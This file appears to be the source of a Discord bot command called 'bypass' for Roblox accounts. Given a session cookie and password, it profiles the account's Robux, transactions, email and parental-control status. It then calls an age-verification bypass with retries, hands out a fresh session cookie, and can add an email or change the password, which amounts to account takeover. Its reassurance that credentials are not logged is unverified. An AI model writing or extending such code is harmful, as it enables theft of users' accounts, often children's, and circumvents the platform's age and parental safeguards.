import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
} from 'discord.js';
import * as Roblox from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
  buildAccountEmbed,
} from '../../lib/embed-helpers';
import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';

const data = new SlashCommandBuilder()
  .setName('bypass')
  .setDescription('Bypass Stuff')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addStringOption((opt) =>
    opt.setName('cookie').setDescription('Insert The Cookies!').setRequired(true)
  )
  .addStringOption((opt) =>
    opt.setName('password')
      .setDescription('Your Roblox password (we do NOT log or store this)')
      .setRequired(true)
  )
  .addStringOption((opt) =>
    opt.setName('new_email')
      .setDescription('Optional: new email to set if no email found')
      .setRequired(false)
  )
  .addStringOption((opt) =>
    opt.setName('new_password')
      .setDescription('Optional: new password to change after bypass')
      .setRequired(false)
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const rawCookie = interaction.options.getString('cookie', true);
    const password = interaction.options.getString('password', true);
    const newEmail = interaction.options.getString('new_email') || undefined;
    const newPassword = interaction.options.getString('new_password') || undefined;

    const validation = await Roblox.validateCookie(rawCookie);
    if (!validation.valid) {
      const embed = validation.isNetworkError ? buildIpLimitEmbed() : buildInvalidCookieEmbed();
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const userId = validation.userId!;
    const age = await Roblox.getUserAge(userId);
    const robux = await Roblox.fetchRobux(rawCookie, String(userId));
    const summary = await Roblox.fetchTransactionTotals(rawCookie, String(userId));
    const country = await Roblox.fetchCountry(rawCookie);
    const email = await Roblox.fetchEmailInfo(rawCookie);
    const parental = await Roblox.fetchParentalControls(rawCookie);
    const thumb = await Roblox.fetchAvatarThumbnail(String(userId));

    let emailStatus = 'No email found';
    if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
    else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;
    const parentStatus = parental.hasParent ? '✅ Parent linked' : '❌ No parent linked';

    const shouldRunBypass = email.verified && !newEmail && !newPassword;

    if (shouldRunBypass) {
      const progressEmbed = buildProgressEmbed('Sending bypass request...');
      await interaction.editReply({ embeds: [progressEmbed] });

      let lastMessage = 'Sending bypass request...';
      let attempts = 0;
      const result = await (async () => {
        let delay = 3000;
        for (let attempt = 1; attempt <= 6; attempt++) {
          attempts = attempt;
          const res = await Roblox.bypassAgeVerification(rawCookie, password);
          if (res.success) return res;
          if (res.inProgress) {
            lastMessage = `Processing... (attempt ${attempt}/6)`;
            const updateEmbed = buildProgressEmbed(lastMessage);
            await interaction.editReply({ embeds: [updateEmbed] });
            if (attempt < 6) {
              await new Promise(resolve => setTimeout(resolve, delay));
              delay = Math.min(delay * 1.5, 10000);
            }
            continue;
          }
          return res;
        }
        return { success: false, message: 'Still processing, please check later.', timedOut: true };
      })();

      if (result.success) {
        let newCookie = result.newCookie;
        let finalUserId = userId;
        let finalUsername = validation.username!;
        let finalDisplayName = validation.displayName || null;
        let finalAge = age;
        let finalRobux = robux;
        let finalSummary = summary;
        let finalCountry = country;
        let finalEmail = email;
        let finalParental = parental;
        let finalThumb = thumb;

        if (newCookie) {
          const newValidation = await Roblox.validateCookie(newCookie);
          if (newValidation.valid) {
            finalUserId = newValidation.userId!;
            finalUsername = newValidation.username!;
            finalDisplayName = newValidation.displayName || null;
            finalAge = await Roblox.getUserAge(finalUserId);
            finalRobux = await Roblox.fetchRobux(newCookie, String(finalUserId));
            finalSummary = await Roblox.fetchTransactionTotals(newCookie, String(finalUserId));
            finalCountry = await Roblox.fetchCountry(newCookie);
            finalEmail = await Roblox.fetchEmailInfo(newCookie);
            finalParental = await Roblox.fetchParentalControls(newCookie);
            finalThumb = await Roblox.fetchAvatarThumbnail(String(finalUserId));
          } else {
            newCookie = undefined;
          }
        }

        const embed = buildAccountEmbed(
          finalUsername,
          finalDisplayName,
          finalUserId,
          finalAge,
          finalRobux,
          finalSummary,
          finalCountry,
          finalEmail.verified ? `✅ Verified: \`${finalEmail.verified}\`` : 'No email found',
          finalParental.hasParent ? '✅ Parent linked' : '❌ No parent linked',
          finalThumb
        );

        const id = newCookie ? Math.random().toString(36).slice(2, 10) : '';
        const row = newCookie ? buildCopyButtons(id, 'bypass', newCookie, false) : undefined;
        await interaction.editReply({ embeds: [embed], components: row ? [row] : [] });
      } else if (result.timedOut) {
        const embed = buildProgressEmbed('Bypass is still in progress. Please check later.');
        await interaction.editReply({ embeds: [embed] });
      } else {
        const embed = buildErrorEmbed(`✧ **Bypass Failed**\n────\n⭑ ${result.message}`);
        await interaction.editReply({ embeds: [embed] });
      }
      return;
    }

    // Handle email/password update
    let successMessages = [];
    if (!email.verified && newEmail) {
      const addEmailResult = await Roblox.addPendingEmail(rawCookie, newEmail, password);
      if (addEmailResult.success) {
        successMessages.push(`📧 Pending email added: ${newEmail}`);
      } else {
        successMessages.push(`❌ Failed to add pending email: ${addEmailResult.error}`);
      }
    }

    if (newPassword) {
      const changePassResult = await Roblox.changePassword(rawCookie, password, newPassword);
      if (changePassResult.success) {
        successMessages.push(`🔑 Password changed successfully!`);
      } else {
        successMessages.push(`❌ Password change failed: ${changePassResult.error}`);
      }
    }

    if (successMessages.length === 0) {
      const embed = buildErrorEmbed('✧ **No Action Taken**\n────\n⭑ No new email or password provided, and bypass not run.');
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const embed = buildSuccessEmbed(
      '✧ **Actions Completed**\n' +
      `────\n` +
      successMessages.map(msg => `⭑ ${msg}`).join('\n') +
      `\n────\n` +
      `⭑ Your credentials were not logged.`
    );
    await interaction.editReply({ embeds: [embed] });
  } catch (err: any) {
    logger.error({ err }, 'Bypass command error');
    await interaction.editReply({
      embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')],
    });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  if (await handleCopyButtonClick(interaction)) return;
}

export const bypassCommand: Command = { data, execute, handleButton };